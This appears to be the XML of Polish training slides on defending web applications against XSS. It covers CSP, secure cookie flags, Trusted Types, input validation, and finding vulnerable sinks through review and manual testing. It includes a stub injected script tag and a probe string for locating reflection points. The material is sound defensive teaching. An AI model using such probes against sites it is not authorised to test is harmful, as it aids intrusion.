                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;wstrzyknięty()&lt;/script&gt; ✗ zablokowany</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="4251424"/>
            <a:ext cx="3488233"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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Druga linia obrony</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> – ogranicza skutki błędu, ale nie zastępuje kodowania.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4402634" y="4251424"/>
            <a:ext cx="3488335"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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Unikaj </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>'unsafe-inline'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> i list domen – łatwo je obejść.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7992566" y="4251424"/>
            <a:ext cx="3488233"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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Wdrażaj przez </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Report-Only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>, zbieraj raporty, potem egzekwuj.</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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OBRONA 4 · DODATKOWE WARSTWY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="11378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Ogranicz szkody i zamknij niebezpieczne API</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1892796"/>
            <a:ext cx="3380284" cy="2632472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3739"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="2200771"/>
            <a:ext cx="2847264"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Bezpieczne ciasteczka</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="2602012"/>
            <a:ext cx="2847264"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2F6DB3"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>Set-Cookie: sid=…; HttpOnly; Secure; SameSite=Lax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="3186212"/>
            <a:ext cx="2847264" cy="79871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4A4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> – JavaScript nie odczyta ciasteczka sesji. Nie zatrzyma XSS, ale utrudnia kradzież sesji.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4405809" y="1892796"/>
            <a:ext cx="3380383" cy="2632472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3739"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="2200771"/>
            <a:ext cx="284736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Trusted Types</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="2602012"/>
            <a:ext cx="2847366"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2F6DB3"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>require-trusted-types-for 'script'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="3186212"/>
            <a:ext cx="2847366" cy="105648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4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Dyrektywa CSP: sinki jak </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> przyjmują tylko obiekty z zatwierdzonej polityki – skuteczna broń na DOM XSS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7995741" y="1892796"/>
            <a:ext cx="3380284" cy="2632472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3739"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="2200771"/>
            <a:ext cx="2847264"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Walidacja wejścia</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="2602012"/>
            <a:ext cx="284726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2F6DB3"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>typ · długość · format</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="2957612"/>
            <a:ext cx="2847264" cy="105648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4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Biała lista oczekiwanych wartości zmniejsza powierzchnię ataku – ale to uzupełnienie kodowania, nie zamiennik.</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2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Jak szukać XSS we własnej aplikacji</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1618555"/>
            <a:ext cx="10566400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D6D2C8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1799530"/>
            <a:ext cx="274701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Code review</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784600" y="1799530"/>
            <a:ext cx="7822438" cy="2996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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Szukaj sinków: innerHTML, document.write, eval, dangerouslySetInnerHTML, v-html, |safe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2254746"/>
            <a:ext cx="10566400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D6D2C8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2435721"/>
            <a:ext cx="274701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Testy ręczne</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784600" y="2435721"/>
            <a:ext cx="7822438" cy="2996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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Wstaw unikalny znacznik (np. xss7q&lt;"'&gt;) i sprawdź, gdzie i w jakim kontekście wraca</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2890937"/>
            <a:ext cx="10566400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D6D2C8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3071912"/>
            <a:ext cx="2747010" cy="5409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Narzędzia</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784600" y="3071912"/>
            <a:ext cx="7822438"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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Burp Suite, OWASP ZAP, DevTools przeglądarki; w CI – SAST i reguły lintera (np. eslint-plugin-no-unsanitized)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3768427"/>
            <a:ext cx="10566400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D6D2C8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="4645918"/>
            <a:ext cx="10566400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D6D2C8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3949402"/>
            <a:ext cx="2747010" cy="5409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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Zasada</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784600" y="3949402"/>
            <a:ext cx="7822438"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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Testuj wyłącznie systemy, do których masz uprawnienia – własne środowiska lub program bug bounty</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5171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CE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Podsumowanie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1666180"/>
            <a:ext cx="168473" cy="629841"/>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08A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1108273" y="1666180"/>
            <a:ext cx="4928062"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ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>XSS to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>dane, które stają się kodem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> – i działają z uprawnieniami ofiary.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6299200" y="1666180"/>
            <a:ext cx="151507" cy="629841"/>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08A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6577707" y="1666180"/>
            <a:ext cx="4945538" cy="629841"/>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ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Koduj wyjście</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> zgodnie z kontekstem i ufaj domyślnym mechanizmom frameworka.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2575421"/>
            <a:ext cx="170557" cy="629841"/>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08A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
